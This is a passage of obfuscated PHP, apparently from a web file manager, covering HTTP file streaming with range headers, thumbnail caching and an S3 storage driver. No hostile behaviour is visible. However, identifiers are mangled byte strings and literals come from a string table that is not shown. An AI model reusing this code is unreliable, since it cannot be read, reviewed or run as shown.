$ä¬æâ¡Ä = $Ù§³×¹[118] . $ä¬æâ¡Ä . $Ù§³×¹[123] . $ä¬æâ¡Ä; if ($û—ûä¾ä) { header($Ù§³×¹[124]); header($Ù§³×¹[125] . $ä¬æâ¡Ä); } else { if ($“«€„Æ) { header($Ù§³×¹[126] . $ä¬æâ¡Ä); } } header($Ù§³×¹[127] . gmdate($Ù§³×¹[110], time() + 3600 * 24 * 30) . $Ù§³×¹[128]); header($Ù§³×¹[129]); header($Ù§³×¹[130]); header($Ù§³×¹[131]); if (isset($_SERVER[$Ù§³×¹[132]]) && strtotime($_SERVER[$Ù§³×¹[132]]) == $„êæµû“[$Ù§³×¹[85]]) { header($Ù§³×¹[133], !0, 304); die; } if (isset($_SERVER[$Ù§³×¹[134]]) && $_SERVER[$Ù§³×¹[134]] == $îİ¸Å¤š) { header($Ù§³×¹[135] . $îİ¸Å¤š, !0, 304); die; } header($Ù§³×¹[135] . $îİ¸Å¤š); header($Ù§³×¹[136] . $Ô¡ •€œ . $Ù§³×¹[128]); header($Ù§³×¹[137] . $ä•à•²); header($Ù§³×¹[138]); header($Ù§³×¹[139] . $Â´ò“µ); header($Ù§³×¹[140]); if (!$û—ûä¾ä && $®úãŠ»é == $Ù§³×¹[141]) { if ($Â´ò“µ > 1024 * 1024 * 5) { die; } $ø®¦Ê— = $this->getContent($§ÆÚ—ûë); $ø®¦Ê— = Html::clearSVG($ø®¦Ê—); header($Ù§³×¹[142] . strlen($ø®¦Ê—)); echo $ø®¦Ê—; die; } $¢‰€Óã = strtolower($_SERVER[$Ù§³×¹[143]]); if ($Û™ü‡œÀ && $¢‰€Óã && $ìòÁ×Á) { if (strstr($¢‰€Óã, $Ù§³×¹[144])) { header($Ù§³×¹[145] . $§ÆÚ—ûë); } else { if (strstr($¢‰€Óã, $Ù§³×¹[146])) { header($Ù§³×¹[147] . $§ÆÚ—ûë); } else { if (strstr($¢‰€Óã, $Ù§³×¹[148])) { header($Ù§³×¹[149] . $§ÆÚ—ûë); } } } if ($ĞéÅÈŞó) { header($Ù§³×¹[150] . $ĞéÅÈŞó); } return; } if (isset($_SERVER[$Ù§³×¹[151]])) { if (preg_match($Ù§³×¹[152], $_SERVER[$Ù§³×¹[151]], $ä¥šÆì½)) { $¯¦´ØŠú = intval($ä¥šÆì½[1]); $¯¦´ØŠú = $¯¦´ØŠú <= 0 ? 0 : ($¯¦´ØŠú >= $‡Ê»€¹š ? $‡Ê»€¹š : $¯¦´ØŠú); if (!empty($ä¥šÆì½[2])) { $î¾«›Ø· = intval($ä¥šÆì½[2]); $‡Ê»€¹š = $î¾«›Ø· < $¯¦´ØŠú ? $¯¦´ØŠú : ($î¾«›Ø· >= $‡Ê»€¹š ? $‡Ê»€¹š : $î¾«›Ø·); } } header($Ù§³×¹[153]); header("\103\157\x6e\x74\x65\156\164\55\122\x61\x6e\x67\145\x3a\40\x62\171\164\x65\163\x20{$¯¦´ØŠú}\55{$‡Ê»€¹š}\57" . $Â´ò“µ); } else { header($Ù§³×¹[154]); } header($Ù§³×¹[155]); $ãÙÂ‚¥Ù = !0; if ($_SERVER[$Ù§³×¹[156]] == $Ù§³×¹[157] && $Â´ò“µ > 1204 * 1024 * 1024 * 2) { $ãÙÂ‚¥Ù = !1; } if ($ãÙÂ‚¥Ù) { header($Ù§³×¹[158] . ($‡Ê»€¹š - $¯¦´ØŠú + 1)); } if ($_SERVER[$Ù§³×¹[159]] == $Ù§³×¹[160]) { return; } $€°Öˆ§¹ = 1024 * 100; $Õô‡›™™ = 0; if ($ĞéÅÈŞó) { $Õô‡›™™ = intval(1000 * 1000 * ($€°Öˆ§¹ / $ĞéÅÈŞó)); } while ($¯¦´ØŠú <= $‡Ê»€¹š) { $µúıÆ£ = timeFloat(); check_abort(); $ˆÍ¤àÊ­ = $‡Ê»€¹š - $¯¦´ØŠú + 1; if ($ˆÍ¤àÊ­ <= $€°Öˆ§¹) { $€°Öˆ§¹ = $ˆÍ¤àÊ­; } echo $this->fileSubstr($§ÆÚ—ûë, $¯¦´ØŠú, $€°Öˆ§¹); $¯¦´ØŠú += $€°Öˆ§¹; if ($€°Öˆ§¹ == $ˆÍ¤àÊ­) { $¯¦´ØŠú = $‡Ê»€¹š + 1; } if ($Õô‡›™™) { $¬£ò’È¼ = intval(1000 * 1000 * (timeFloat() - $µúıÆ£)); $Ö‘³Î› = $Õô‡›™™ - $¬£ò’È¼; if ($Ö‘³Î› > 5) { usleep($Ö‘³Î›); } } } } public function fileOutServer($¶½åÊ¾Û, $ãÎÊ´ğó = false, $Ó§¾…é¦ = false, $‡Ú³…Õ™ = '') { $this->fileOut($¶½åÊ¾Û, $ãÎÊ´ğó, $Ó§¾…é¦, $‡Ú³…Õ™); } public function fileOutLink($ÒÓæ˜ä§) { header($_SERVER[óó‹¸‚å][161] . $ÒÓæ˜ä§); die; } public function cacheMethod($Íª¸­­•, $ÛîÉ‹ô, $‰ÊÍ–ûŞ = null) { $•éà×í´ =& $_SERVER[óó‹¸‚å]; static $¹‹İáî½ = array(); $‘ş˜ŠÏ = $ÛîÉ‹ô ? ltrim($this->getPathOuter($ÛîÉ‹ô), $•éà×í´[8]) : $•éà×í´[12]; $é·ë¨èÈ = $•éà×í´[162] . $Íª¸­­• . $•éà×í´[163] . rtrim($‘ş˜ŠÏ, $•éà×í´[8]); if (is_null($Íª¸­­•)) { $¹‹İáî½ = array(); return; } if (is_null($ÛîÉ‹ô)) { foreach ($¹‹İáî½ as $é·ë¨èÈ => $±ƒ®ñµã) { if (!strstr($é·ë¨èÈ, $•éà×í´[162] . $Íª¸­­• . $•éà×í´[164])) { continue; } unset($¹‹İáî½[$é·ë¨èÈ]); } return; } if (!is_null($‰ÊÍ–ûŞ)) { $¹‹İáî½[$é·ë¨èÈ] = $‰ÊÍ–ûŞ; return; } $”•£¯Æ = isset($¹‹İáî½[$é·ë¨èÈ]) ? $¹‹İáî½[$é·ë¨èÈ] : null; if (!is_null($”•£¯Æ)) { return $”•£¯Æ; } $”•£¯Æ = $this->{$Íª¸­­•}($ÛîÉ‹ô); $¹‹İáî½[$é·ë¨èÈ] = $”•£¯Æ; return $”•£¯Æ; } public function cacheMethodInfoSet($ãî¾À, $ÃÙ·É“, $½ÖõÉ¼ = false) { $°æ«ò =& $_SERVER[óó‹¸‚å]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($°æ«ò[165], $ãî¾À, $ÃÙ·É“); $this->cacheMethod($°æ«ò[166], $ãî¾À, $ÃÙ·É“ ? !1 : !0); if (is_array($½ÖõÉ¼)) { $this->cacheMethod($°æ«ò[167], $ãî¾À, $½ÖõÉ¼); } } public function fileOutImage($î‹ÜÔ÷, $šªë›Á’ = 250) { $¸“£’ªÉ =& $_SERVER[óó‹¸‚å]; set_timeout(); if (substr($î‹ÜÔ÷, 0, 4) == $¸“£’ªÉ[148]) { $this->fileOutLink($î‹ÜÔ÷); } $È•›ğÃÖ = $this->info($î‹ÜÔ÷); $©Ø‹ûÔ = $È•›ğÃÖ[$¸“£’ªÉ[32]]; $Òœğ±ô = !1; if (isset($GLOBALS[$¸“£’ªÉ[168]]) && $GLOBALS[$¸“£’ªÉ[168]][$¸“£’ªÉ[84]] == $È•›ğÃÖ[$¸“£’ªÉ[84]]) { $ü‹è»Ú = $GLOBALS[$¸“£’ªÉ[168]][$¸“£’ªÉ[169]]; if (!$È•›ğÃÖ[$¸“£’ªÉ[170]]) { $È•›ğÃÖ[$¸“£’ªÉ[170]] = $GLOBALS[$¸“£’ªÉ[168]]; } if (isset($ü‹è»Ú[$¸“£’ªÉ[171]])) { if ($ü‹è»Ú[$¸“£’ªÉ[171]] <= $šªë›Á’ && $ü‹è»Ú[$¸“£’ªÉ[172]] <= $šªë›Á’) { $Òœğ±ô = !0; } } $©Ø‹ûÔ = $È•›ğÃÖ[$¸“£’ªÉ[170]][$¸“£’ªÉ[32]]; } if ($È•›ğÃÖ[$¸“£’ªÉ[76]] <= 1024 * 50 || $Òœğ±ô || !function_exists($¸“£’ªÉ[173]) || $È•›ğÃÖ[$¸“£’ªÉ[174]] == $¸“£’ªÉ[175]) { return $this->fileOut($î‹ÜÔ÷, !1, $©Ø‹ûÔ); } if (isset($È•›ğÃÖ[$¸“£’ªÉ[170]][$¸“£’ªÉ[176]])) { $ØÆÌ®á½ = $È•›ğÃÖ[$¸“£’ªÉ[170]][$¸“£’ªÉ[176]]; } else { if (isset($È•›ğÃÖ[$¸“£’ªÉ[170]][$¸“£’ªÉ[177]])) { $ØÆÌ®á½ = $È•›ğÃÖ[$¸“£’ªÉ[170]][$¸“£’ªÉ[177]]; } } if (!$ØÆÌ®á½) { $ØÆÌ®á½ = md5("{$È•›ğÃÖ[$¸“£’ªÉ[32]]}\137{$È•›ğÃÖ[$¸“£’ªÉ[84]]}\137{$È•›ğÃÖ[$¸“£’ªÉ[76]]}\137{$šªë›Á’}"); } $ñ¾”ĞšŠ = "{$ØÆÌ®á½}\x5f{$šªë›Á’}\x2e\160\x6e\x67"; if (!($Ñ‹à†î³ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¸“£’ªÉ[178]))) { $°ÚœŠ¼á = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¸“£’ªÉ[179]); } else { $°ÚœŠ¼á = KodIO::make($Ñ‹à†î³); } if ($Ñ‹à†î³ = IO::fileNameExist($°ÚœŠ¼á, $ñ¾”ĞšŠ)) { $†˜Õ¤Ï¡ = KodIO::make($Ñ‹à†î³); return IO::fileOut($†˜Õ¤Ï¡, !1, $©Ø‹ûÔ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $†˜Õ¤Ï¡ = DATA_THUMB . $ñ¾”ĞšŠ; del_file($†˜Õ¤Ï¡); if (!@file_exists($†˜Õ¤Ï¡)) { $ˆÂÛ‹¬ = TEMP_FILES; if (!is_dir($ˆÂÛ‹¬)) { mk_dir($ˆÂÛ‹¬); } $üÏÀéÏ = $ˆÂÛ‹¬ . $ØÆÌ®á½ . $¸“£’ªÉ[10] . $È•›ğÃÖ[$¸“£’ªÉ[174]]; if (!@file_exists($üÏÀéÏ)) { $üÏÀéÏ = $this->download($î‹ÜÔ÷, $üÏÀéÏ); } ImageThumb::createThumb($üÏÀéÏ, $†˜Õ¤Ï¡, $šªë›Á’, $šªë›Á’ * 10); } if (!file_exists($†˜Õ¤Ï¡) || filesize($†˜Õ¤Ï¡) < 100) { return @file_exists($üÏÀéÏ) ? IO::fileOut($üÏÀéÏ) : $this->fileOut($î‹ÜÔ÷); } if (!($›ª†ôŸí = IO::move($†˜Õ¤Ï¡, $°ÚœŠ¼á))) { return IO::fileOut($†˜Õ¤Ï¡); } del_file($†˜Õ¤Ï¡); IO::fileOut($›ª†ôŸí); } public function fileOutImageServer($ö³º¤, $©ëó·Ñ• = 250) { $this->fileOutImage($ö³º¤, $©ëó·Ñ•); } public function fileNameAuto($Æğ€¶ŸÈ, $ˆçò¶Ç£, $¡Ô§°ÄÇ = REPEAT_RENAME, $Ì¯«»å¼ = false) { $…Ä¾İÌ =& $_SERVER[óó‹¸‚å]; $Ìéò® ü = $Æğ€¶ŸÈ === $…Ä¾İÌ[12] ? $ˆçò¶Ç£ : rtrim($Æğ€¶ŸÈ, $…Ä¾İÌ[8]) . $…Ä¾İÌ[8] . $ˆçò¶Ç£; if ($¡Ô§°ÄÇ == REPEAT_REPLACE || !$this->exist($Ìéò® ü) || $Ì¯«»å¼ && $¡Ô§°ÄÇ != REPEAT_RENAME_FOLDER) { return $ˆçò¶Ç£; } if ($¡Ô§°ÄÇ == REPEAT_SKIP) { return !1; } $÷ïé³Š = $…Ä¾İÌ[10] . get_path_ext($ˆçò¶Ç£); $÷ïé³Š = $÷ïé³Š == $…Ä¾İÌ[10] || $Ì¯«»å¼ ? $…Ä¾İÌ[12] : $÷ïé³Š; $Şïê‡¤’ = 1; $ğ¬„—áÄ = substr($ˆçò¶Ç£, 0, strlen($ˆçò¶Ç£) - strlen($÷ïé³Š)); $ßÃÓÇÇ = $ğ¬„—áÄ . "\50{$Şïê‡¤’}\x29{$÷ïé³Š}"; while ($this->exist(rtrim($Æğ€¶ŸÈ, $…Ä¾İÌ[8]) . $…Ä¾İÌ[8] . $ßÃÓÇÇ)) { $ßÃÓÇÇ = $ğ¬„—áÄ . "\x28{$Şïê‡¤’}\x29{$÷ïé³Š}"; $Şïê‡¤’++; } return $ßÃÓÇÇ; } private function fileNameAutoList($§‰Ÿ™èœ, $Ã¹˜œ‹©, $ñÀ„¢Ÿ¥ = false) { $©ÆŸÄä¼ =& $_SERVER[óó‹¸‚å]; $©°÷˜ùÇ = $this->listPath($§‰Ÿ™èœ, !0); $©°÷˜ùÇ = array_merge($©°÷˜ùÇ[$©ÆŸÄä¼[82]], $©°÷˜ùÇ[$©ÆŸÄä¼[83]]); $¯•åª™Ì = array_to_keyvalue($©°÷˜ùÇ, $©ÆŸÄä¼[12], $©ÆŸÄä¼[32]); $¨Á…óÉ¥ = $©ÆŸÄä¼[10] . get_path_ext($Ã¹˜œ‹©); $¨Á…óÉ¥ = $¨Á…óÉ¥ == $©ÆŸÄä¼[10] || $ñÀ„¢Ÿ¥ ? $©ÆŸÄä¼[12] : $¨Á…óÉ¥; $¢œŒÎôå = substr($Ã¹˜œ‹©, 0, strlen($Ã¹˜œ‹©) - strlen($¨Á…óÉ¥)); $Åõ¤ŠÄÅ = $¢œŒÎôå . "\50\60\51{$¨Á…óÉ¥}"; for ($®Œ×­¯ = 1; $®Œ×­¯ <= count($¯•åª™Ì) + 1; $®Œ×­¯++) { $Åõ¤ŠÄÅ = $¢œŒÎôå . "\x28{$®Œ×­¯}\51{$¨Á…óÉ¥}"; if (!in_array_not_case($Åõ¤ŠÄÅ, $¯•åª™Ì)) { return $Åõ¤ŠÄÅ; } } return $Åõ¤ŠÄÅ; } public function listAllFiles($²Ñå²â, $âÉ®¹›, $ú‚í“¡¼ = array()) { $¶ÎÑ® Â =& $_SERVER[óó‹¸‚å]; if (empty($âÉ®¹›)) { return array(); } $“·¹Í³Š = array(); $²Ñå²â = trim($²Ñå²â, $¶ÎÑ® Â[8]); foreach ($âÉ®¹› as $‚–Ê•Ïã) { $°…×›ÎÉ = ltrim(substr(trim($‚–Ê•Ïã, $¶ÎÑ® Â[8]), strlen($²Ñå²â)), $¶ÎÑ® Â[8]); $“·¹Í³Š = array_merge($“·¹Í³Š, $this->slicePath($°…×›ÎÉ)); } $Âó´²õÄ = array(); foreach (array_unique($“·¹Í³Š) as $‚–Ê•Ïã) { $–¢ ·Ÿ = array($¶ÎÑ® Â[84] => $this->getPathOuter($¶ÎÑ® Â[8] . $²Ñå²â . $¶ÎÑ® Â[8] . $‚–Ê•Ïã), $¶ÎÑ® Â[75] => 1, $¶ÎÑ® Â[76] => 0); if (substr($‚–Ê•Ïã, -1) != $¶ÎÑ® Â[8]) { $–¢ ·Ÿ[$¶ÎÑ® Â[75]] = 0; $€û§æ¯ = $this->getPath($²Ñå²â . $¶ÎÑ® Â[8] . $‚–Ê•Ïã); $–¢ ·Ÿ[$¶ÎÑ® Â[76]] = isset($ú‚í“¡¼[$€û§æ¯]) ? $ú‚í“¡¼[$€û§æ¯] : $this->size($€û§æ¯); } $Âó´²õÄ[] = $–¢ ·Ÿ; } return $Âó´²õÄ; } public function slicePath($ÛÕ¯çÃ’) { $¦Î¹²ˆ =& $_SERVER[óó‹¸‚å]; $—úë¥çò = explode($¦Î¹²ˆ[8], trim($ÛÕ¯çÃ’, $¦Î¹²ˆ[8])); $¬÷í„‡õ = 0; do { ++$¬÷í„‡õ; $¦ıõ˜‹Ó[] = implode($¦Î¹²ˆ[8], array_slice($—úë¥çò, 0, $¬÷í„‡õ)) . $¦Î¹²ˆ[8]; } while ($¬÷í„‡õ < count($—úë¥çò)); $¦ıõ˜‹Ó[count($—úë¥çò) - 1] = $ÛÕ¯çÃ’; return $¦ıõ˜‹Ó; } public function getHost() { $¼üõ®¿ğ =& $_SERVER[óó‹¸‚å]; $ÄõÍËË¢ = parse_url(trim($this->domain, $¼üõ®¿ğ[8])); $¥¹âÖê = isset($ÄõÍËË¢[$¼üõ®¿ğ[180]]) ? $ÄõÍËË¢[$¼üõ®¿ğ[180]] : http_type(); $Óáòİª = isset($ÄõÍËË¢[$¼üõ®¿ğ[181]]) ? $ÄõÍËË¢[$¼üõ®¿ğ[181]] : $ÄõÍËË¢[$¼üõ®¿ğ[84]]; if (isset($ÄõÍËË¢[$¼üõ®¿ğ[182]])) { $Óáòİª .= $¼üõ®¿ğ[4] . $ÄõÍËË¢[$¼üõ®¿ğ[182]]; } return $¥¹âÖê . $¼üõ®¿ğ[183] . $Óáòİª; } public function pathEncode($ºÒ¨„¿ı) { $áå°¸Ğ =& $_SERVER[óó‹¸‚å]; return str_replace($áå°¸Ğ[184], $áå°¸Ğ[8], rawurlencode($ºÒ¨„¿ı)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($ğÀÖ¢»ğ) { set_timeout(); require_once SDK_DIR . $_SERVER[óó‹¸‚å][185]; parent::__construct(); $this->_init($ğÀÖ¢»ğ); } public function _init($ƒÇ¦„¡©) { foreach ($ƒÇ¦„¡© as $©–ı¥’ => $Â½°À¸Æ) { if (isset($this->{$©–ı¥’})) { $this->{$©–ı¥’} = $Â½°À¸Æ; } } $this->endpoint = $ƒÇ¦„¡©[$_SERVER[óó‹¸‚å][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ºËÖ–áí = "\x76\64") { $this->signVer = $ºËÖ–áí; $this->client->setSignatureVersion($ºËÖ–áí); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ş¼ÑÜø’ =& $_SERVER[óó‹¸‚å]; $éº“”±İ = $this->getBucketCors(); if (!$éº“”±İ || !is_array($éº“”±İ)) { return !1; } if ($éº“”±İ[$Ş¼ÑÜø’[187]] != $Ş¼ÑÜø’[188] || $éº“”±İ[$Ş¼ÑÜø’[189]] != $Ş¼ÑÜø’[188]) { return !1; } $¤õÉòì´ = array_map($Ş¼ÑÜø’[190], $éº“”±İ[$Ş¼ÑÜø’[191]]); if (!is_array($¤õÉòì´)) { $¤õÉòì´ = array(); } $Ë·â‚ = array($Ş¼ÑÜø’[192], $Ş¼ÑÜø’[193], $Ş¼ÑÜø’[194], $Ş¼ÑÜø’[195], $Ş¼ÑÜø’[196]); $¢ÄãåŞ‹ = array_diff($Ë·â‚, $¤õÉòì´); return empty($¢ÄãåŞ‹); } public function mkfile($ª ßİõş, $Í‰šüÃ° = '', $È”ıĞÀ’ = REPEAT_RENAME) { $†á¢Åõ = $this->setContent($ª ßİõş, $Í‰šüÃ°); if ($†á¢Åõ !== !1) { return $this->getPathOuter($ª ßİõş); } return !1; } public function mkdir($§ã¾»ŒÂ, $©Ûñ« = REPEAT_SKIP) { $ÒÖ‚ì‘’ =& $_SERVER[óó‹¸‚å]; if (empty($§ã¾»ŒÂ) && $§ã¾»ŒÂ !== $ÒÖ‚ì‘’[197]) { return !1; } if ($©Ûñ« && $this->_isFolder($§ã¾»ŒÂ)) { return $this->getPathOuter($§ã¾»ŒÂ); } $‰êÌç÷Í = $this->setContent($§ã¾»ŒÂ, $ÒÖ‚ì‘’[12], !0); if ($‰êÌç÷Í !== !1) { return $this->getPathOuter($§ã¾»ŒÂ); } return !1; } public function copyFile($«°İÍ§Ù, $³Œ¦îÅ§, $ùù·Ë’œ = array()) { $ÂØÉºÎ =& $_SERVER[óó‹¸‚å]; $°ëŞ­£· = $this->objectMeta($«°İÍ§Ù); if (!$°ëŞ­£·) { return !1; } if ($°ëŞ­£·[$ÂØÉºÎ[76]] <= 1024 * 1024 * 200) { $°Ñ™»± = $this->client->copyObject($this->bucket, $«°İÍ§Ù, $this->bucket, $³Œ¦îÅ§, $ÂØÉºÎ[198], $ùù·Ë’œ); } else { $°Ñ™»± = $this->client->multiCopyObject($this->bucket, $«°İÍ§Ù, $this->bucket, $³Œ¦îÅ§, $ùù·Ë’œ); } $°Ñ™»± = $°Ñ™»± ? $this->getPathOuter($³Œ¦îÅ§) : !1; return $°Ñ™»±; } public function moveFile($”İ•å÷», $çïèŞÂ÷) { if ($this->copyFile($”İ•å÷», $çïèŞÂ÷)) { $this->delFile($”İ•å÷»); return $this->getPathOuter($çïèŞÂ÷); } return !1; } public function delFile($®Å¿…) { return $this->client->deleteObject($this->bucket, $®Å¿…); } public function delFolder($æ‹Í½àà) { $ïñÌ¶ı =& $_SERVER[óó‹¸‚å]; if (!$this->exist($æ‹Í½àà)) { return !0; } $this->listItemCache = !1; $ë¬±ØèÍ = $this->fileList($æ‹Í½àà); $this->listItemCache = !0; $¢°úŠŸş = trim($æ‹Í½àà, $ïñÌ¶ı[8]) . $ïñÌ¶ı[8]; if (!empty($æ‹Í½àà) && $æ‹Í½àà !== $ïñÌ¶ı[197] && !in_array($¢°úŠŸş, $ë¬±ØèÍ[$ïñÌ¶ı[82]])) { $ë¬±ØèÍ[$ïñÌ¶ı[82]][] = $¢°úŠŸş; } $ĞªÁ®¤ = $this->delByBatch($ë¬±ØèÍ[$ïñÌ¶ı[83]]); if (!$ĞªÁ®¤) { return !1; } $ĞªÁ®¤ = $this->delByBatch($ë¬±ØèÍ[$ïñÌ¶ı[82]]); if (!$ĞªÁ®¤) { return !1; } return $this->delFile($¢°úŠŸş); } private function delByBatch($ô­™¨Åè) { foreach (array_chunk($ô­™¨Åè, 1000) as $È¾À¼àû) { $šìòÌòÛ = $this->client->deleteObjects($this->bucket, $È¾À¼àû); if (!$šìòÌòÛ) { return !1; } } return !0; } public function rename($“Ë¢ê¸, $Ãä®Òô) { return $this->renameObject($“Ë¢ê¸, $Ãä®Òô); } public function listPath($ú³­·š, $çÇøò‘ = false) { $Ìõİ­ =& $_SERVER[óó‹¸‚å]; $ÏÏè’»¯ = $this->fileList($ú³­·š, $Ìõİ­[8], !0); foreach ($ÏÏè’»¯[$Ìõİ­[82]] as $ğ±óò† => $­›äú¥ı) { $ÏÏè’»¯[$Ìõİ­[82]][$ğ±óò†] = $this->folderInfo($­›äú¥ı, $çÇøò‘, $­›äú¥ı); } foreach ($ÏÏè’»¯[$Ìõİ­[83]] as $ğ±óò† => $­›äú¥ı) { $ÏÏè’»¯[$Ìõİ­[83]][$ğ±óò†] = $this->fileInfo($­›äú¥ı[$Ìõİ­[32]], $çÇøò‘, $­›äú¥ı); } return $ÏÏè’»¯; } protected function infoChildren($’ÀôÊ , &$¸õÍƒä—) { $¿ûÁŒÂø =& $_SERVER[óó‹¸‚å]; $İÀ©ÔÒó = $this->fileList($’ÀôÊ , $¿ûÁŒÂø[12], !0); $¸õÍƒä—[$¿ûÁŒÂø[78]] += count($İÀ©ÔÒó[$¿ûÁŒÂø[82]]); $¸õÍƒä—[$¿ûÁŒÂø[77]] += count($İÀ©ÔÒó[$¿ûÁŒÂø[83]]); foreach ($İÀ©ÔÒó[$¿ûÁŒÂø[83]] as $ñƒŒÄ¦) { if (!$ñƒŒÄ¦ || !$ñƒŒÄ¦[$¿ûÁŒÂø[76]]) { continue; } $¸õÍƒä—[$¿ûÁŒÂø[76]] += $ñƒŒÄ¦[$¿ûÁŒÂø[76]]; } } private function fileInfo($‘‚éÆÅ†, $’¹ªËŞ• = false, $¦ÍçÁÁú = array()) { $âÅİø´ =& $_SERVER[óó‹¸‚å]; $ùÜıæÄÛ = array($âÅİø´[32] => $this->pathThis($‘‚éÆÅ†), $âÅİø´[84] => $this->getPathOuter($‘‚éÆÅ†), $âÅİø´[33] => $âÅİø´[199], $âÅİø´[174] => $this->ext($‘‚éÆÅ†), $âÅİø´[76] => isset($¦ÍçÁÁú[$âÅİø´[76]]) ? $¦ÍçÁÁú[$âÅİø´[76]] : 0); if ($’¹ªËŞ•) { return $ùÜıæÄÛ; } $ùÜıæÄÛ[$âÅİø´[200]] = $ùÜıæÄÛ[$âÅİø´[85]] = 0; $ùÜıæÄÛ[$âÅİø´[201]] = $ùÜıæÄÛ[$âÅİø´[202]] = !0; if (empty($¦ÍçÁÁú)) { $¦ÍçÁÁú = $this->objectMeta($‘‚éÆÅ†); if (!$¦ÍçÁÁú) { return $ùÜıæÄÛ; } } if (isset($¦ÍçÁÁú[$âÅİø´[203]])) { $ùÜıæÄÛ[$âÅİø´[85]] = $¦ÍçÁÁú[$âÅİø´[203]]; } if (isset($¦ÍçÁÁú[$âÅİø´[76]])) { $ùÜıæÄÛ[$âÅİø´[76]] = $¦ÍçÁÁú[$âÅİø´[76]]; } return $ùÜıæÄÛ; } private function folderInfo($§Àï‚·ˆ, $üßş§¨ª = false, $¬ÒãæíÙ = array()) { $ŠØÒ“í† =& $_SERVER[óó‹¸‚å]; $œ•³²÷Ó = array($ŠØÒ“í†[32] => $this->pathThis($§Àï‚·ˆ), $ŠØÒ“í†[84] => $this->getPathOuter($ŠØÒ“í†[8] . $§Àï‚·ˆ), $ŠØÒ“í†[33] => $ŠØÒ“í†[75]); if ($üßş§¨ª) { return $œ•³²÷Ó; } $œ•³²÷Ó[$ŠØÒ“í†[200]] = $œ•³²÷Ó[$ŠØÒ“í†[85]] = 0; $œ•³²÷Ó[$ŠØÒ“í†[201]] = $œ•³²÷Ó[$ŠØÒ“í†[202]] = !0; if ($§Àï‚·ˆ == $ŠØÒ“í†[12]) { return $œ•³²÷Ó; } if (empty($¬ÒãæíÙ)) { $¬ÒãæíÙ = $this->objectMeta(trim($§Àï‚·ˆ, $ŠØÒ“í†[8]) . $ŠØÒ“í†[8]); } if (isset($¬ÒãæíÙ[$ŠØÒ“í†[203]])) { $œ•³²÷Ó[$ŠØÒ“í†[200]] = $¬ÒãæíÙ[$ŠØÒ“í†[203]]; } return $œ•³²÷Ó; } private function fileList($©£®Üğ, $å—¢¼‚¿ = '', $§µéíï’ = 0) { $ÊÔ„‡¹Œ =& $_SERVER[óó‹¸‚å]; $›§’³Ê¨ = rtrim($©£®Üğ, $ÊÔ„‡¹Œ[8]) . $ÊÔ„‡¹Œ[8]; $˜ş™»ú° = $this->listObjs($›§’³Ê¨, null, null, $å—¢¼‚¿); if (!$˜ş™»ú°) { return array($ÊÔ„‡¹Œ[82] => array(), $ÊÔ„‡¹Œ[83] => array()); } $ÑŸœÔ = $Åµ»ñ÷İ = array(); foreach ($˜ş™»ú°[$ÊÔ„‡¹Œ[204]] as $Ü§·Û’”) { $àù•“¯² = $Ü§·Û’”[$ÊÔ„‡¹Œ[32]]; if ($àù•“¯² == $›§’³Ê¨) { continue; } $×®÷¢¤ñ = isset($Ü§·Û’”[$ÊÔ„‡¹Œ[76]]) ? $Ü§·Û’”[$ÊÔ„‡¹Œ[76]] : 0; $¨œÃúÖİ = $×®÷¢¤ñ == 0 && substr($àù•“¯², strlen($àù•“¯²) - 1, 1) == $ÊÔ„‡¹Œ[8] ? !0 : !1; $this->cacheMethodInfoSet($àù•“¯², $¨œÃúÖİ, $Ü§·Û’”); if ($¨œÃúÖİ) { $ÑŸœÔ[] = $àù•“¯²; continue; } $Åµ»ñ÷İ[] = $§µéíï’ ? $Ü§·Û’” : $àù•“¯²; } foreach ($˜ş™»ú°[$ÊÔ„‡¹Œ[205]] as $Ü§·Û’”) { $ÑŸœÔ[] = $Ü§·Û’”[$ÊÔ„‡¹Œ[32]]; $this->cacheMethodInfoSet($Ü§·Û’”[$ÊÔ„‡¹Œ[32]], !0); } $this->cacheMethodInfoSet($©£®Üğ, !0); return array($ÊÔ„‡¹Œ[82] => $ÑŸœÔ, $ÊÔ„‡¹Œ[83] => $Åµ»ñ÷İ); } private function listObjs($’ú²İŠ», $‘Ã‘Ëòš = null, $®œÉö = null, $æí¯úÁº = null) { $ç Ë¤Ë =& $_SERVER[óó‹¸‚å]; $’ú²İŠ» = trim($’ú²İŠ», $ç Ë¤Ë[8]); $â‰ü’“ = empty($’ú²İŠ») && $’ú²İŠ» !== $ç Ë¤Ë[197] ? $ç Ë¤Ë[12] : $’ú²İŠ» . $ç Ë¤Ë[8]; return $this->client->getBucket($this->bucket, $â‰ü’“, $‘Ã‘Ëòš, $®œÉö, $æí¯úÁº, !0); } public function has($ğÙŞê÷, $¹Äû©ÓÆ = false, $§…Ê”¹Ÿ = true) { $ûíÉµ‰ =& $_SERVER[óó‹¸‚å]; $ğÙŞê÷ = trim($ğÙŞê÷, $ûíÉµ‰[8]); $àç‡¾Ù÷ = empty($ğÙŞê÷) && $ğÙŞê÷ !== $ûíÉµ‰[197] ? $ûíÉµ‰[12] : $ğÙŞê÷ . $ûíÉµ‰[8]; $Š÷Êé× = null; $ºÚâŞë = 500; $Š”¦¼üö = $ûíÉµ‰[8]; $£ÓÁ·€ì = $¸”ºö = array(); while (!0) { $ö•ÛŠå° = $this->listObjs($ğÙŞê÷, $Š÷Êé×, $ºÚâŞë, $Š”¦¼üö); if (!$ö•ÛŠå°) { break; } $Š÷Êé× = $ö•ÛŠå°[$ûíÉµ‰[206]]; $„‘Œ§†Ç = $ö•ÛŠå°[$ûíÉµ‰[204]]; $ĞÍ·ù = $ö•ÛŠå°[$ûíÉµ‰[205]]; if (empty($„‘Œ§†Ç) && empty($ĞÍ·ù)) { break; } if (count($„‘Œ§†Ç) == 1 && $„‘Œ§†Ç[0][$ûíÉµ‰[32]] == $àç‡¾Ù÷) { break; } if ($¹Äû©ÓÆ) { if 